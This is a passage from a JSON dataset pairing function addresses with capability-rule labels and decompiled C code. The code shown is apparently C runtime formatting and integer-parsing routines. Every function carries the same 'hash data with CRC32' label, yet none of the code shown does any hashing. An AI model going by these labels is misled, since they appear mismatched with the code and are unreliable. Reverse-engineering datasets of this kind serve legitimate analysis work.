CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049e5ab:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403cd3(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.00405df8(&var_4h, arg_ch, arg_14h, in_ECX + 0xc);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403cd3(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00404110(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403cd3(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1729
    },
    "00403616": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403616(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    if (arg_8h < 0x100) {\n        if ((*(\n              L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n              + (arg_8h & 0xff)) & 1) != 0) {\n            arg_8h = *((arg_8h & 0xff) + *(*arg_ch + 0x94));\n        }\n        return arg_8h & 0xff;\n    }\n    uVar1 = fcn.00402360(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 484
    },
    "00404f8e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00404f8e(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x0049fed2:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x0049fed6:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049fed9:\n            cVar5 = fcn.004042fa(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049fe7e:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049fed9;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x0049fe92;\n                if (uVar7 < 0x45) goto code_r0x004a0071;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x004a0071;\n                    goto code_r0x0049fe66;\n                }\n            }\ncode_r0x0049fee2:\n            cVar5 = fcn.00404002();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.00404a07();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x0049fee2;\n            if (uVar7 != 99) goto code_r0x004a0071;\ncode_r0x0049fe92:\n            cVar5 = fcn.004026b7(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.0040143d();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x0049fee2;\n            if (uVar7 == 0x69) goto code_r0x0049fed2;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.00402478();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x004a0071;\n                cVar5 = fcn.00402608();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x004a0071;\n                arg_ch_00 = 0;\n                goto code_r0x0049fe7e;\n            }\n            goto code_r0x0049fed6;\n        }\ncode_r0x0049fe66:\n        cVar5 = fcn.00403be3();\n    }\n    if (((cVar5 == '\\0') || (cVar5 = fcn.004025e5(),  cVar5 != '\\0')) || (*(param_1 + 0x30) != '\\0'))\n    goto code_r0x004a0071;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x0049ff7c;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049ff7c:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00402937(&var_ch, arg_ch, param_1 + 0x18);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403f2b(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.00405d1c(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x004a0071:\n    fcn.00403085(unaff_ESI);\n    return;\n}\n",
        "token_count": 1748
    },
    "00403760": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403760(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00402739(*(in_ECX + 0x2c));\n    var_ch = 0;\n    var_8h = 0;\n    if (var_4h == 1) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00402658(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00401be5(&var_ch);\n        }\n    }\n    else if (var_4h == 2) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040515f(&var_ch);\n        }\n        else {\n            cVar1 = fcn.004028fb(&var_ch);\n        }\n    }\n    else if (var_4h == 4) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00404a75(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00404fc0(&var_ch);\n        }\n    }\n    else {\n        if (var_4h != 8) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00406663(&var_ch);\n        }\n        else {\n            cVar1 = fcn.004056ff(&var_ch);\n        }\n    }\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.00406528();\n    if (cVar1 != '\\0') {\n        uVar3 = *(in_ECX + 0x20);\n        arg_ch_00 = var_8h;\n        arg_8h_00 = var_ch;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n            uVar3 = uVar3 | 0x40;\n            *(in_ECX + 0x20) = uVar3;\n            arg_ch_00 = -(var_8h + (var_ch != 0));\n            arg_8h_00 = -var_ch;\n        }\n        if (*(in_ECX + 0x28) < 0) {\n            *(in_ECX + 0x28) = 1;\n        }\n        else {\n            *(in_ECX + 0x20) = uVar3 & 0xfffffff7;\n            fcn.00404bb5(*(in_ECX + 0x28));\n        }\n        if ((arg_8h_00 | arg_ch_00) == 0) {\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n        }\n        *(in_ECX + 0x3c) = 0;\n        if (var_4h == 8) {\n            fcn.004012e4(arg_8h_00, arg_ch_00, arg_8h, arg_ch);\n        }\n        else {\n            fcn.00402d24(arg_8h_00, arg_8h, arg_ch);\n        }\n        if (((*(in_ECX + 0x20) >> 7 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (**(in_ECX + 0x34) != '0')))) {\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n            **(in_ECX + 0x34) = 0x30;\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1018
    },
    "004887ae": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004887ae(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00405a60(in_ECX + 1);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00403936": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00403936(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    uVar1 = **0x56f458 - 0x41;\n    *0x56f458 = *0x56f458 + 1;\n    if (0x14 < uVar1) {\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        *(arg_8h + 1) = 2;\n        return arg_8h;\n    }\n    var_8h = 0;\n    var_4h = 2;\n    if ((~(*0x56f460 >> 1) & 1) != 0) {\n        uVar1 = uVar1 & 0xfffffffe;\n        if (uVar1 < 0xd) {\n            if (uVar1 == 0xc) {\n                arg_8h_00 = 7;\n            }\n            else if (uVar1 == 0) {\n                arg_8h_00 = 1;\n            }\n            else if (uVar1 == 2) {\n                arg_8h_00 = 2;\n            }\n            else if (uVar1 == 4) {\n                arg_8h_00 = 4;\n            }\n            else if (uVar1 == 6) {\n                arg_8h_00 = 3;\n            }\n            else {\n                if (uVar1 != 8) goto code_r0x0048c2eb;\n                arg_8h_00 = 5;\n            }\n        }\n        else if (uVar1 == 0xe) {\n            arg_8h_00 = 8;\n        }\n        else if (uVar1 == 0x10) {\n            arg_8h_00 = 6;\n        }\n        else if (uVar1 == 0x12) {\n            arg_8h_00 = 9;\n        }\n        else {\n            if (uVar1 != 0x14) goto code_r0x0048c2eb;\n            arg_8h_00 = 10;\n        }\n        _var_10h = fcn.00402ce3(arg_8h_00);\n        fcn.004022a2(&var_10h);\n    }\ncode_r0x0048c2eb:\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    return arg_8h;\n}\n",
        "token_count": 618
    },
    "0040393b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040393b(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar4;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar5;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar5 = param_1[10];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[10] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar5 = 0,  *(param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1;\n        iVar5 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404bb5(iVar5 + 0x15d);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.00405911();\n        param_1[10] = iVar5 + -0x15d;\n    }\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar3;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.00405911();\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    iVar5 = *(param_1 + 0x31);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.004030f8();\n    arg_10h = fcn.00405911();\n    fcn.00404156(&var_8h, puVar3, arg_10h, arg_14h, arg_18h, iVar5, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.0040229d(param_1[0xd], param_1[2]);\n    }\n    if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        fcn.00405b23(param_1[0xd], param_1[2]);\n    }\n    pcVar4 = param_1[0xd];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xd] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        *(param_1 + 0x31) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xe] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1079
    },
    "0040394f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004bfa5c)\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.0040394f(uint arg_8h, uint16_t *arg_ch, uint16_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint64_t uVar1;\n    uint16_t *puVar2;\n    char cVar3;\n    uint *puVar4;\n    uint16_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t extraout_ECX;\n    uint16_t uVar8;\n    uint32_t arg_8h_00;\n    uint64_t uVar9;\n    int64_t iVar10;\n    int32_t var_b8h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar2 = arg_ch;\n    cVar3 = fcn.004025db();\n    if (cVar3 != '\\0') {\n        if ((arg_14h == 0) || ((1 < arg_14h && (arg_14h < 0x25)))) {\n            fcn.004057e5(arg_8h);\n            uVar1 = 0;\n            uVar8 = *arg_ch;\n            puVar5 = arg_ch + 1;\n            while( true ) {\n                arg_8h_00 = uVar8;\n                iVar6 = fcn.0040211c(arg_8h_00, 8);\n                if (iVar6 == 0) break;\n                uVar8 = *puVar5;\n                puVar5 = puVar5 + 1;\n            }\n            var_4h = arg_18h & 0xff;\n            if (uVar8 == 0x2d) {\n                var_4h = var_4h | 2;\ncode_r0x004bf53b:\n                arg_8h_00 = *puVar5;\n                puVar5 = puVar5 + 1;\n            }\n            else if (uVar8 == 0x2b) goto code_r0x004bf53b;\n            iVar6 = 0xff10;\n            var_14h = 0x6f0;\n            var_1ch = 0x966;\n            arg_ch = puVar5;\n            if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x004bf84e;\n            uVar8 = arg_8h_00;\n            if (uVar8 < 0x30) goto code_r0x004bf7d9;\n            if (uVar8 < 0x3a) {\n                iVar6 = arg_8h_00 - 0x30;\ncode_r0x004bf7d4:\n                if (iVar6 == -1) goto code_r0x004bf7d9;\n            }\n            else {\n                if (0xff0f < uVar8) {\n                    if (uVar8 < 0xff1a) {\ncode_r0x004bf6ab:\n                        iVar6 = arg_8h_00 - iVar6;\n                    }\n                    else {\n                        iVar6 = -1;\n                    }\n                    goto code_r0x004bf7d4;\n                }\n                if (0x65f < uVar8) {\n                    if (uVar8 < 0x66a) {\n                        iVar6 = arg_8h_00 - 0x660;\n                        goto code_r0x004bf7d4;\n                    }\n                    if ((0x6ef < uVar8) &&\n                       ((iVar6 = 0x6f0,  uVar8 < 0x6fa ||\n                        ((0x965 < uVar8 &&\n                         ((iVar6 = var_1ch,  uVar8 < 0x970 ||\n                          ((iVar6 = 0x9e6,  0x9e5 < uVar8 &&\n                           ((uVar8 < 0x9f0 ||\n                            ((iVar6 = 0xa66,  0xa65 < uVar8 &&\n                             ((uVar8 < 0xa70 ||\n                              ((iVar6 = 0xae6,  0xae5 < uVar8 &&\n                               ((uVar8 < 0xaf0 ||\n                                ((iVar6 = 0xb66,  0xb65 < uVar8 &&\n                                 ((uVar8 < 0xb70 ||\n                                  ((iVar6 = 0xc66,  0xc65 < uVar8 &&\n                                   ((uVar8 < 0xc70 ||\n                                    ((iVar6 = 0xce6,  0xce5 < uVar8 &&\n                                     ((uVar8 < 0xcf0 ||\n                                      ((iVar6 = 0xd66,  0xd65 < uVar8 &&\n                                       ((uVar8 < 0xd70 ||\n                                        ((iVar6 = 0xe50,  0xe4f < uVar8 &&\n                                         ((uVar8 < 0xe5a ||\n                                          ((iVar6 = 0xed0,  0xecf < uVar8 &&\n                                           ((uVar8 < 0xeda ||\n                                            ((iVar6 = 0xf20,  0xf1f < uVar8 &&\n                                             ((uVar8 < 0xf2a ||\n                                              ((iVar6 = 0x1040,  0x103f < uVar8 &&\n                                               ((uVar8 < 0x104a ||\n                                                ((iVar6 = 0x17e0,  0x17df < uVar8 &&\n                                                 ((uVar8 < 0x17ea ||\n                                                  ((iVar6 = 0x1810,  0x180f < uVar8 && (uVar8 < 0x181a))))))))))))))))))\n                                          )))))))))))))))))))))))))))))))))))))))) goto code_r0x004bf6ab;\n                }\ncode_r0x004bf7d9:\n                if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                    iVar6 = -1;\n                }\n                else {\n                    uVar7 = arg_8h_00;\n                    if (arg_8h_00 - 0x61 < 0x1a) {\n                        uVar7 = arg_8h_00 - 0x20;\n                    }\n                    iVar6 = uVar7 - 0x37;\n                }\n            }\n            if (iVar6 == 0) {\n                uVar7 = *puVar5;\n                arg_ch = puVar5 + 1;\n                if ((uVar7 == 0x78) || (uVar7 == 0x58)) {\n                    if (arg_14h == 0) {\n                        arg_14h = 0x10;\n                    }\n                    arg_8h_00 = *arg_ch;\n                    arg_ch = puVar5 + 2;\n                }\n                else {\n                    if (arg_14h == 0) {\n                        arg_14h = 8;\n                    }\n                    fcn.00402ecd(uVar7);\n                }\n            }\n            else if (arg_14h == 0) {\n                arg_14h = 10;\n            }\ncode_r0x004bf84e:\n            uVar9 = fcn.00401820(0xffffffff, 0xffffffff, arg_14h, arg_14h >> 0x1f, arg_14h);\n            do {\n                var_10h = uVar1 >> 0x20;\n                var_8h = uVar1;\n                uVar8 = arg_8h_00;\n                if (uVar8 < 0x30) {\ncode_r0x004bfa0b:\n                    if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                        uVar7 = 0xffffffff;\n                    }\n                    else {\n                        uVar7 = arg_8h_00;\n                        if (arg_8h_00 - 0x61 < 0x1a) {\n                            uVar7 = arg_8h_00 - 0x20;\n                        }\n                        uVar7 = uVar7 - 0x37;\n                    }\n                }\n                else {\n                    if (uVar8 < 0x3a) {\n                        uVar7 = arg_8h_00 - 0x30;\n                    }\n                    else {\n                        iVar6 = 0xff10;\n                        if (uVar8 < 0xff10) {\n                            if ((uVar8 < 0x660) ||\n                               ((iVar6 = 0x660,  0x669 < uVar8 &&\n                                ((uVar8 < 0x6f0 ||\n                                 ((iVar6 = var_14h,  0x6f9 < uVar8 &&\n                                  ((uVar8 < 0x966 ||\n                                   ((iVar6 = var_1ch,  0x96f < uVar8 &&\n                                    ((iVar6 = 0x9e6,  uVar8 < 0x9e6 ||\n                                     ((0x9ef < uVar8 &&\n                                      ((iVar6 = 0xa66,  uVar8 < 0xa66 ||\n                                       ((0xa6f < uVar8 &&\n                                        ((iVar6 = 0xae6,  uVar8 < 0xae6 ||\n                                         ((0xaef < uVar8 &&\n                                          ((iVar6 = 0xb66,  uVar8 < 0xb66 ||\n                                           ((0xb6f < uVar8 &&\n                                            ((iVar6 = 0xc66,  uVar8 < 0xc66 ||\n                                             ((0xc6f < uVar8 &&\n                                              ((iVar6 = 0xce6,  uVar8 < 0xce6 ||\n                                               ((0xcef < uVar8 &&\n                                                ((iVar6 = 0xd66,  uVar8 < 0xd66 ||\n                                                 ((0xd6f < uVar8 &&\n                                                  ((iVar6 = 0xe50,  uVar8 < 0xe50 ||\n                                                   ((0xe59 < uVar8 &&\n                                                    ((iVar6 = 0xed0,  uVar8 < 0xed0 ||\n                                                     ((0xed9 < uVar8 &&\n                                                      ((iVar6 = 0xf20,  uVar8 < 0xf20 ||\n                                                       ((0xf29 < uVar8 &&\n                                                        ((iVar6 = 0x1040,  uVar8 < 0x1040 ||\n                                                         ((0x1049 < uVar8 &&\n                                                          ((iVar6 = 0x17e0,  uVar8 < 0x17e0 ||\n                                                           ((0x17e9 < uVar8 &&\n                                                            ((iVar6 = 0x1810,  uVar8 < 0x1810 || (0x1819 < uVar8))))))))\n                                                         ))))))))))))))))))))))))))))))))))))))))))))))))))))))\n                            goto code_r0x004bfa0b;\n                        }\n                        else if (0xff19 < uVar8) {\n                            uVar7 = 0xffffffff;\n                            goto code_r0x004bfa06;\n                        }\n                        uVar7 = arg_8h_00 - iVar6;\n                    }\ncode_r0x004bfa06:\n                    if (uVar7 == 0xffffffff) goto code_r0x004bfa0b;\n                }\n                if ((uVar7 == 0xffffffff) || (arg_14h <= uVar7)) goto code_r0x004bfac7;\n                if ((uVar1 < uVar9) || ((uVar9 == uVar1 && ((arg_14h != 0 || (uVar7 <= extraout_ECX)))))) {\n                    iVar10 = fcn.0040262b(arg_14h, arg_14h >> 0x1f, uVar1);\n                    uVar1 = iVar10 + 0x1c;\n                    var_4h = var_4h | 8;\n                }\n                else {\n                    var_4h = var_4h | 0xc;\n                }\n                arg_8h_00 = *arg_ch;\n                arg_ch = arg_ch + 1;\n            } while( true );\n        }\n        puVar4 = fcn.004039a4();\n        *puVar4 = 0x16;\n        fcn.00403751();\n    }\n    uVar1 = 0;\ncode_r0x004bf4cc:\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    return uVar1;\ncode_r0x004bfac7:\n    fcn.00402ecd(arg_8h_00);\n    if ((var_4h & 8) == 0) {\n        uVar1 = 0;\n        arg_ch = puVar2;\n    }\n    else {\n        cVar3 = fcn.00403b02(var_4h, var_8h, var_10h);\n        if (cVar3 == '\\0') {\n            if ((var_4h & 2) != 0) {\n                uVar1 = CONCAT44(-(var_10h + (var_8h != 0)), -var_8h);\n            }\n        }\n        else {\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x22;\n            if ((var_4h & 1) == 0) {\n                uVar1 = 0xffffffffffffffff;\n            }\n            else if ((var_4h & 2) == 0) {\n                uVar1 = 0x7fffffffffffffff;\n            }\n            else {\n                uVar1 = 0x8000000000000000;\n            }\n        }\n    }\n    if (var_ach != '\\0') {\n        *(var_b8h + 0x350) = *(var_b8h + 0x350) & 0xfffffffd;\n    }\n    goto code_r0x004bf4cc;\n}\n",
        "token_count": 3417
    },
    "0046ba6b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ba6b(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    \n    fcn.00405182();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00403b02": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00403b02(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    if ((arg_8h & 4) != 0) {\n        return 1;\n    }\n    if ((arg_8h & 1) != 0) {\n        if ((arg_8h & 2) == 0) {\n            if (0x7fffffff < arg_10h) {\n                return 1;\n            }\n        }\n        else if ((0x7fffffff < arg_10h) && ((0x80000000 < arg_10h || (arg_ch != 0)))) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 162
    },
    "00403b11": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
